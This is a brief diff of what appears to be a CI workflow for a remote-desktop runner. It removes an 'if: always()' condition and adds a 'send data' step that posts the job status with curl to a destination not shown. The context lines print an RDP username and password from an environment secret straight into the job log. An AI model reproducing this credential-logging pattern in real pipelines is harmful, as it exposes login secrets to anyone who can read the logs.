@@ -105,8 +105,8 @@ jobs:
           Write-Host "Username: RDP"
           Write-Host "Password: $(echo $env:RDP_CREDS)"
           Write-Host "==================`n"
-          
-        if: always()
+      
+      - name: send data    
         run: |
           STATUS="${{ job.status }}"
           curl -s -H "Content-Type: application/json" \
